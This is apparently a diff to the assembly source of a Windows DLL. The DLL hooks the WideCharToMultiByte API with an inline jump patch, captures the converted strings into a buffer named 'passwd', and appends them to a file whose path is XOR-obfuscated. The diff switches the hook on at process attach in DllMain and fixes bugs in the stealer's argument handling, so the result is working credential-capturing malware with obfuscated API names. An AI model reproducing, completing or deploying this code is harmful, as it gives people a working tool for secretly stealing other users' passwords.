@@ -27,8 +27,8 @@ hooked_wide_char_to_multibyte_inline_patch:
 
     mov [rbp + 16], rcx             ; code page
     mov [rbp + 24], rdx             ; dwflags
-    mov [rbp + 32], r8              ; ccWideChar
-    mov [rbp + 40], r9              ; lpWideCharStr
+    mov [rbp + 32], r8              ; lpWideCharStr
+    mov [rbp + 40], r9              ; ccWideCHar 
 
     ; [rbp - 8] = return value
     ; [rbp - 16] = bytes written
@@ -37,54 +37,56 @@ hooked_wide_char_to_multibyte_inline_patch:
     sub rsp, 32                     ; allocate local variable space
     sub rsp, 32                     ; allocate 32 byte shadow space
 
-    ; replace patch with original bytes so the original function can be called and 
-    ; operation can continue as normal
-    sub rsp, 16                         ; 1 arg + 8 bytes padding
-    mov rcx, -1                         ; current process
+    ; restore the original function code, so it be called to 
+    ; continue the normal workflow
+    sub rsp, 16                     ; 1 arg + padding
+    mov rcx, -1                     ; current proc id
     mov rdx, [wide_char_to_multibyte]
     mov r8, original_func_bytes
-    mov r9, 14
+    mov r9, original_func_bytes.len
     mov qword [rsp + 32], 0
     call [write_process_memory]
-    add rsp, 16                         ; 1 arg + 8 bytes padding
+    add rsp, 16                     ; 1 arg + padding
 
-    cmp rax, 0                          ; WriteProcessMemory failed ?
-    je .shutdown
+    cmp rax, 0                      ; did WriteProcessMemory fail ?
+    je .error_shutdown
 
     ; call the original function
-    sub rsp, 32                     ; 4 args
-    mov rcx, [rbp + 16]
-    mov rdx, [rbp + 24]
-    mov r8, [rbp + 32]
-    mov r9, [rbp + 40]
-    mov rax , [rbp + 48]
+    sub rsp, 64                     ; 4 args 
+
+    mov rcx, [rbp + 16]             ; code page
+    mov rdx, [rbp + 24]             ; dwflags
+    mov r8, [rbp + 32]              ; lpWideCharStr
+    mov r9d, [rbp + 40]             ; ccWideChar
+
+    mov rax, [rbp + 48]             ; lpMultiByteStr
     mov [rsp + 32], rax
-    mov rax, [rbp + 56]
+
+    mov eax, [rbp + 56]             ; ccMultiByte
     mov [rsp + 40], rax
-    mov rax, [rbp + 64]
-    mov [rsp + 48], rax
-    mov rax, [rbp + 72]
-    mov [rsp + 56], rax
-    call [wide_char_to_multibyte]   ; bytes written
-    add rsp, 32                     ; 4 args
+
+    mov rax, [rbp + 64]             ; lpDefaultChar
+    mov qword [rsp + 48], rax 
+
+    mov rax, [rbp + 72]             ; lpUseDefaultChar
+    mov qword [rsp + 56], rax
+
+    call [wide_char_to_multibyte]   ; bytes written in rax
+
+    cmp rax, 0                      ; did function fail ?
+    je .error_shutdown
 
     mov [rbp - 16], rax             ; bytes written
 
-    ; sub rsp, 32
-    mov rcx, passwd
-    mov rdx, [rbp + 48]             ; lpMultiByteStr
-    call strcpy
-    ; add rsp, 32
+    add rsp, 64                     ; 4 args
 
-    ; sub rsp, 32
     mov rcx, file_path_xor
     mov rdx, file_path_xor.len
     mov r8, xor_key
     mov r9, xor_key.len
     call my_xor
-    ; add rsp, 32
 
-    sub rsp, 32                     ; 3 args + 8 byte padding
+    sub rsp, 64                     ; 3 args + padding
     mov rcx, file_path_xor
     mov rdx, FILE_APPEND_DATA
     mov r8, FILE_SHARE_READ
@@ -92,35 +94,38 @@ hooked_wide_char_to_multibyte_inline_patch:
     mov qword [rsp + 32], OPEN_ALWAYS
     mov qword [rsp + 40], FILE_ATTRIBUTE_NORMAL
     mov qword [rsp + 48], 0
-    call [create_file]              ; file handle
-    add rsp, 32                     ; 3 args + 8 byte padding
+    call [create_file_a]            ; file handle
+    add rsp, 64                     ; 3 args + padding
 
-    cmp rax, INVALID_HANDLE_VALUE   ; file handle invalid ?
-    je .shutdown
+    cmp rax, INVALID_HANDLE_VALUE   ; did CreateFileA fail ?
+    je .error_shutdown
 
     mov [rbp - 24], rax             ; file handle
 
-    sub rsp, 16                     ; 1 arg + 8 byte paddding
-    mov rcx, [rbp - 24]             ; text file handle
+    mov rcx, [rbp + 48]             ; lpMultiByteStr
     mov rdx, passwd
-    mov r8, [rbp - 16]              ; bytes to write, len of passwd entered
+    call strcpy
+
+    sub rsp, 16                     ; 1 arg + 8 byte padding
+    mov rcx, [rbp - 24]             ; file handle
+    mov rdx, passwd
+    mov r8, [rbp - 16]              ; bytes written
+    ; dec r8                          ; omit trailing 0
     xor r9, r9
     mov qword [rsp + 32], 0
     call [write_file]
     add rsp, 16                     ; 1 arg + 8 byte padding
 
-    cmp rax, 0                      ; write file failed ?
-    je .shutdown
+    cmp rax, 0                      ; did write file fail ?
+    je .error_shutdown
 
-    ; sub rsp, 32
-    mov rcx, [rbp - 24]             ; text file handle
-    call [close_handle]
-    ; add rsp, 32
-
-    cmp rax, 0                      ; close handle failed ?
-    je .shutdown
+.error_shutdown:
+    call [get_last_error]
 
 .shutdown:
+    mov rcx, [rbp - 24]             ; file handle
+    call [close_handle]
+
     add rsp, 32                     ; free 32 byte shadow space
     add rsp, 32                     ; free local variable space
 
@@ -137,94 +142,83 @@ hook_iat:
 hook_inline_patch:
     push rbp
     mov rbp, rsp
+    
     ; [rbp - 8] = return value
     ; [rbp - 16] = kernel handle
     ; [rbp - 32] = patch
-    sub rsp, 32                     ; allocate local variable space
-    sub rsp, 32                     ; allocate shadow space
+    sub rsp, 32                         ; allocate local variable space
+    sub rsp, 32                         ; allocate shadow space
 
-    mov qword [rbp - 8], 0          ; return value
+    mov qword [rbp - 8], 0              ; return value
 
-    ; sub rsp, 32
-    call get_kernel_module_handle   ; kernel handle
-    ; add rsp, 32
+    call get_kernel_module_handle       ; kernel handle
 
-    cmp rax, 0                      ; kernel handle == 0 ?
+    cmp rax, 0                          ; kernel handle == 0 ?
     je .shutdown
 
-    mov [rbp - 16], rax             ; kernel handle
+    mov [rbp - 16], rax                 ; kernel handle
 
-    ; sub rsp, 32
     mov rcx, [rbp - 16]
     call populate_kernel_function_ptrs_by_name
-    ; add rsp, 32
 
-    ; sub rsp, 32
     mov rcx, wide_char_to_multibyte_xor
     mov rdx, wide_char_to_multibyte_xor.len
     mov r8, xor_key
     mov r9, xor_key.len
     call my_xor
-    ; add rsp, 32
 
-    ; sub rsp, 32
-    mov rcx, [rbp - 16]
+    mov rcx, [rbp - 16]                 ; kernel handle
     mov rdx, wide_char_to_multibyte_xor
-    call [get_proc_addr]            ; wide char to multi byte addr
-    ; add rsp, 32
+    call [get_proc_addr]                ; proc addr
 
-    cmp rax, 0                      ; is addr == 0 ?
+    cmp rax, 0                          ; is proc addr = 0 ?
     je .shutdown
 
-    mov [wide_char_to_multibyte], rax   ; WideCharToMultiByte addr
+    mov [wide_char_to_multibyte], rax   ; proc addr
 
-    ; sub rsp, 32
-    ; call [get_current_process] ; current proc id
-    ; add rsp, 32
+    ; read the original function code
+    sub rsp, 16                         ; 1 arg + padding
+    mov rcx, -1                         ; current process
+    mov rdx, [wide_char_to_multibyte]   ; ptr to function
+    mov r8, original_func_bytes         ; ptr to original bytes
+    mov r9, original_func_bytes.len     ; num bytes
+    mov qword [rsp + 32], 0             ; NULL
+    call [read_process_memory]          
+    add rsp, 16                         ; 1 args + padding
 
-    ; mov [rbp - 24], rax             ; current proc id
-
-    ; read 14 bytes from the original function
-    sub rsp, 16                     ; 1 arg + 8 byte padding
-    mov rcx, -1                     ; current proc id
-    mov rdx, [wide_char_to_multibyte]
-    mov r8, original_func_bytes
-    mov r9, 14
-    mov qword [rsp + 32], 0
-    call [read_process_memory]      ; read result
-    add rsp, 16                     ; 1 arg + 8 byte padding
-
-    cmp rax, 0                      ; ReadProcessMemory failed ?
+    cmp rax, 0                          ; did ReadProcessMemory fail ?
     je .shutdown
 
     ; create patch
-    ; sub rsp, 32
-    mov rcx, rbp
-    sub rcx, 32
-    mov dword [rcx], 0x25ff
-    add rcx, 4
-    mov dword [rcx], 0
-    add rcx, 2
-    mov rax, hooked_wide_char_to_multibyte_inline_patch
-    mov [rcx], rax
+    mov rax, rbp
+    sub rax, 32                         ; patch addr
+    mov dword [rax], 0x25ff
+    add rax, 4
+    mov word [rax], 0
+    add rax, 2
+    mov rcx, hooked_wide_char_to_multibyte_inline_patch
+    mov qword [rax], rcx
 
-    ; replace original code with patch
-    sub rsp, 16                         ; 1 arg + 8 bytes padding
-    mov rcx, -1                         ; current proc id
-    mov rdx, [wide_char_to_multibyte]
+    ; overwrite the original code with the patch
+    sub rsp, 16                         ; 1 arg + padding
+    mov rcx, -1                         ; current process
+    mov rdx, [wide_char_to_multibyte]   ; ptr to function
     mov r8, rbp
-    sub r8, 32
-    mov r9, 14
-    mov qword [rsp + 32], 0
+    sub r8, 32                          ; patch
+    mov r9, original_func_bytes.len     ; num bytes
+    mov qword [rsp + 32], 0             ; NULL
     call [write_process_memory]
-    add rsp, 16                         ; 1 arg + 8 bytes padding
+    add rsp, 16                         ; 1 arg + padding
 
-    cmp rax, 0                          ; WriteProcess failed ?
+    cmp rax, 0                          ; did WriteProcessMemory fail ?
     je .shutdown
 
 .shutdown:
-    add rsp, 32                     ; free shadow space
-    add rsp, 32                     ; free local variable space
+
+    mov rax, [rbp - 8]                  ; return value
+
+    add rsp, 32                         ; free shadow space
+    add rsp, 32                         ; free local variable space
 
     leave
     ret
@@ -245,7 +239,7 @@ DllMain:
     cmp qword [rbp + 24], 1                 ; PROCESS_ATTACH
     jne .continue
 
-    ; call hook_inline_patch
+    call hook_inline_patch
     jmp .shutdown
 
 .continue:
@@ -273,4 +267,5 @@ just_str: db 'just', 0
 section .bss
 wide_char_to_multibyte: dq ?
 original_func_bytes: resb 14
+.len equ $ - original_func_bytes
 passwd: resb 128
